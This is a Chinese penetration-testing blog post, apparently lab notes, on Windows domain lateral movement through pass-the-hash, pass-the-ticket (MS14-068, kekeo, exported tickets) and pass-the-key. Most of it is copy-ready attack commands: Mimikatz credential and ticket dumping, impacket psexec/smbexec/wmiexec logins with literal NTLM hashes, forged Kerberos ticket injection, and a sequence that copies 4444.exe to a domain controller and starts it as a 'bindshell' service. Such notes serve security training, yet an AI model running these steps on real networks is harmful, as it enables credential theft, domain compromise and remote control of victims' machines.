---
title: 横向移动-day3-PTT/PTH/PYK篇
date: 2024-03-21 17:32 +0800
categories: [内网,横向移动] 
tags: [横向移动,ptt,pth,ptk]
img_path: /img/penetration/
---

1. PTH 在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。但进行横线移动的时候还是利用前两天的漏洞利用方式，即SMB、WMI、IPC等等；
2. PTT 攻击的部分就不是简单的NTLM认证了，它是利用Kerberos协议进行攻击的，这里就介绍三种常见的攻击方法：MS14-068，Golden ticket，SILVER ticket，简单来说就是将连接合法的票据注入到内存中实现连接。 MS14-068 就是一个经典的漏洞提权以及移动方式！！！
3. ptk 打了补丁才能用户都可以连接，采用aes256连接，漏洞利用条件比较苛刻。

接下来，我们主要实验的部分就是针对PTH以及PTT，这是因为PTK的利用条件实在是太苛刻了。。。

在进行实验前，我们首先需要抓取一些内网信息，诸如密码hash，用户名等等。

## PTH

PTH = Pass The Hash， 主要就是之利用密码的hash值来进行攻击的。==主要利用的lm或ntlm的值进行的渗透测试（NTLM认证攻击）==

主要用两种方式进行利用与移动：1）Mimikatz；2）impacket套件。

在域环境中，用户登录计算机时使用的域账号，计算机会用相同本地管理员账号和密码。 因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就可以使用哈希传递的方法登录到内网主机的其他计算机。== 但是移动的过程还是利用前面的，例如smb等等。==

### 1）Mimikatz

测试权限：

```shell
mimikatz privilege::debug
```

进行连接：

```shell
mimikatz sekurlsa::pth /user:administrator /domain:192.168.3.29 /ntlm:518b98ad4178a53695dc997aa02d455c
```

然后，这时候靶机上就会弹出一个shell：

![截图](67f9d14c96da5c1a26d10ca9e24c6e05.png)

然后，尝试使用命令即可发现已经获取到权限了：

![截图](0f8624a30ea705e9487a2ad6ec5ef4db.png)

### 2）impacket

就是前两天使用的工具，只是不一样的在于这里使用的是hash值！

```cmd
psexec -hashes :NTLM值 域名/域用户@域内ip地址
smbexec -hashes :NTLM值 域名/域用户@域内ip地址
wmiexec -hashes :NTLM值 域名/域用户@域内ip地址
```

以下展示其中一个：

```cmd
python .\smbexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.29
```

![截图](db5d3d052cf6f0ca34bba235a935f125.png)

成功利用！！！

## PTT

PTT = pass the Ticket。 ==利用的票据凭证TGT进行渗透测试（Kerberos认证攻击）==

主要利用的方式就是：1）漏洞票据；2）票据劫持。

### 漏洞票据——MS14-068

==MS14-068是密钥分发中心（KDC）服务中的Windows漏洞。==    

它允许经过身份验证的用户在其==Kerberos票证（TGT）==中插入任意PAC。该漏洞位于kdcsvc.dll域控制器的密钥分发中心(KDC)中。用户可以通过呈现具有改变的PAC的Kerberos TGT来获得票证。以下我们主要通过漏洞MS14-068(webadmin权限)——利用漏洞生成的用户的新身份票据尝试认证。

- 获取用户SID值

```shell
shell whoami /user
```

<br/>

<br/>

注意！！！ 这里需要使用的是对应你登陆密码的SID，而不是system的，如果使用以下system的SID是不会成功的

![截图](8e0f5a446cbe63b266108313621ca1a9.png)

- 生产票据文件：

先上传ms14-068到靶机上：

![截图](5123207b9f160b06d9a73c1231d11f16.png)

```shell
shell ms14-068.exe -u webadmin@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1132 -d 192.168.3.21 -p admin!@#45
```

![截图](14e674b7c231cdc6df7979c177dd9074.png)

- 查看当前存储的票据

```shell
shell klist
```

![截图](deffb4a4d2c78c63f70cedf4f30e50a9.png)

- 内存导入票据

```shell
mimikatz kerberos::ptc C:\Users\webadmin\Desktop\TGT_webadmin@god.org.ccache
```

然后查看是否导入了票据：

![截图](b0a9aa8df51173a67768bf930bd30801.png)

- 连接目标上线

==这里注意，我们连接的机子需要使用计算机名而不是ip地址！！！==

我们可以使用以下命令查看计算机用户名：

```shell
shell nbtstat -a 192.168.3.21
```

![截图](f53415683a10d9acea4c042f3c20a2ed.png)

直接使用以下命令也可以查看：

```shell
shell net user 
```

![截图](76099c047db87a8ed0d83f8fc3fd4ed1.png)

连接上线：

```shell
shell dir \\OWA2010CN-GOD\c$
```

![截图](0c6d34707ec792eccdebab8df37bcbbc.png)

上线的命令！！

```shell
shell net use \\OWA2010CN-GOD\C$
shell copy 4444.exe \\OWA2010CN-GOD\C$
shell sc \\OWA2010CN-GOD create bindshell binpath= "c:\4444.exe"
shell sc \\OWA2010CN-GOD start bindshell
```

![截图](40d6d9953a8817a2191b409b70f5776a.png)

### 票据劫持——kekeo

利用获取的NTLM生成新的票据尝试认证。

因为当前主机肯定之前与其他主机连接过，所以本地应该生成了一些票据， 我们可以导出这些票据，然后再导入票据，利用。该方法类似于cookie欺骗。
缺点：票据是有有效期的，所以如果当前主机在连接过域控的话，有效期内可利用。

- 生成票据

如果，我们直接使用webadmin这个密码凭据的话是无法连上的！！！ 因为hash值不匹配。（为了加强对这个的理解，如下展示一次失败的案例)

![截图](83b527fa305cb23bde58866f7f4af37a.png)

```shell
shell kekeo "tgt::ask /user:Administrator /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c" "exit"
```

![截图](a91b3f044417a122c3b6d1c6aeb3e849.png)

很明显示认证失败了！！！因此，我前两天在横向移动中，我们发现在jack-pc主机上存有域控主机的密码。因此我们首先横向移动到jack-pc上！！

![截图](9bdb1d41d9a889e9e7fc8d28ad466c8a.png)

![截图](a67308511befde61ac25d216e2c1cc4f.png)

读取密码：

![截图](3089ba8420f4f950b82ff7a2c4323f34.png)

![截图](296c55d0b4f8da7f68a0479bb9e9eda5.png)

使用新的hash密码：

```shell
shell kekeo "tgt::ask /user:Administrator /domain:god.org /ntlm:ccef208c6485269c20db2cad21734fe7" "exit"
```

![截图](935ff3caf79b0270189e3c7761041d9e.png)

- 导入票据

```shell
shell kekeo "kerberos::ptt TGT_Administrator@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi" "exit"
```

![截图](fdecf87d391d52c75f8b5470cd78fb37.png)

- 利用该票据连接

```shell
shell dir \\owa2010cn-god\c$
```

![截图](c008db8b787a59a3998ec560b8683c0b.png)

### 3）历史票据遗留信息

用历史遗留的票据重新认证尝试。

- 导出历史票据信息

```shell
mimikatz sekurlsa::tickets /export
```

![截图](238975ecd32230b78b2683a95eaeef3a.png)

- 导入票据：

```shell
mimikatz kerberos::ptt C:\Users\webadmin\Desktop\[0;3e7]-2-1-40e00000-Administrator@krbtgt-god.org.kirbi
```

![截图](c2332caa596e5220cab18919fec9163e.png)

## PTK

PTK = Pass The Key。利用前提：==当系统安装了KB2871997补丁且禁用了NTLM的时候，==

那我们抓取到的ntlm hash也就失去了作用，但是可以通过PTK的攻击方式获得权限。
mimikatz sekurlsa::ekeys
mimikatz sekurlsa::pth /user:域用户名 /domain:域名 /aes256:aes256值

